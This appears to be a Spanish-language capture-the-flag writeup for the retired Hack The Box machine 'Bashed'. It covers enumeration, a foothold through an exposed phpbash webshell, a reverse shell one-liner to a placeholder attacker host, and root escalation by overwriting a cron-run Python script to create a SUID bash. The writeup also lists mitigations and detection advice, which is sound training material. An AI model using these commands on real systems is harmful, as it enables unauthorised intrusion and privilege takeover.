---
machine: Bashed
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, web, webshell, sudo, cron, suid]
---

# Bashed — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Solo hay un Apache con una web de desarrollo. En `/dev/` queda `phpbash.php`, una webshell que el propio administrador dejó publicada, así que el foothold es inmediato como `www-data`. La escalada viene de un `sudo -u scriptmanager` sin contraseña y de un cron de root que ejecuta todos los `.py` de `/scripts/`, directorio donde `scriptmanager` puede escribir.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
80/tcp  open  http  Apache httpd 2.4.18 ((Ubuntu))
```

Un único puerto. El título de la página, «Arrexel's Development Site», ya apunta a un entorno de pruebas.

## Enumeración

```bash
gobuster dir -u http://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php,txt -t 40
```

```text
/dev        (Status: 301)
/uploads    (Status: 301)
/php        (Status: 301)
/images     (Status: 301)
/css        (Status: 301)
/js         (Status: 301)
/fonts      (Status: 301)
/config.php (Status: 200)
```

En `/dev` hay dos ficheros:

```bash
curl -s http://<IP>/dev/ -o - | grep -o 'href="[^"]*"'
# phpbash.php
# phpbash.min.php
```

## Foothold

```text
http://<IP>/dev/phpbash.php
```

La página es una consola web que ejecuta comandos como el usuario de Apache:

```text
www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No hay exploit: la herramienta de desarrollo quedó en producción y sirve comandos a cualquiera. Para trabajar cómodo conviene lanzar una reverse shell desde ahí:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
sudo -l
```

```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Se puede actuar como `scriptmanager`, dueño de `/scripts`, donde vive `test.py`. Hay además un `test.txt` de root con marca de tiempo reciente:

```bash
ls -la /scripts
# -rwxr--r-- 1 root          root    ... test.txt
# -rwxr--r-- 1 scriptmanager scriptmanager ... test.py
```

`pspy` o simplemente esperar confirma que root ejecuta los scripts cada minuto. Como la webshell filtra redirecciones, se escribe con `tee`:

```bash
echo "import os; os.system('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash')" \
  | sudo -u scriptmanager tee /scripts/test.py
```

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash
/tmp/rootbash -p -c "cat /root/root.txt"
```

`-p` conserva el euid y `-c` permite ejecutar sin TTY, que es lo que hay detrás de una webshell.

## Evidencia

- `id` en la webshell → `www-data`.
- `ls -la /tmp/rootbash` con bit SUID.
- `cat /root/root.txt` (redactado).

## Lecciones aprendidas

- Las herramientas de desarrollo en producción son un foothold regalado: `phpbash`, `adminer`, `phpinfo`, consolas de prueba.
- `sudo -u usuario` sin contraseña no da shell, pero sí permite escribir donde ese usuario tenga permisos.
- Un cron de root sobre un directorio escribible por otro usuario es escalada directa, aunque el script original no tenga nada malo.
- `tee` resuelve la escritura cuando la shell no interpreta `>`.
- `bash -p` es imprescindible con SUID: sin `-p` se pierde el euid.

## Mitigaciones y detección

- Nunca dejar webshells ni utilidades de administración en el webroot; si se necesitan, detrás de autenticación y fuera de producción.
- Revisar `sudo -l` por rol: `(usuario) NOPASSWD: ALL` es equivalente a ese usuario.
- Los cron de root no deben ejecutar código de directorios escribibles por terceros; usar propietario root y permisos 0755.
- Alertar de creación de ficheros SUID fuera de rutas de paquetes y de escrituras en `/scripts`, `/etc/cron.*`.
- MITRE: T1505.003 (webshell), T1053.003 (cron), T1548.001 (SUID).

## Referencias

- GTFOBins: `bash`, `tee`.
- MITRE ATT&CK: T1505.003, T1053.003, T1548.001.
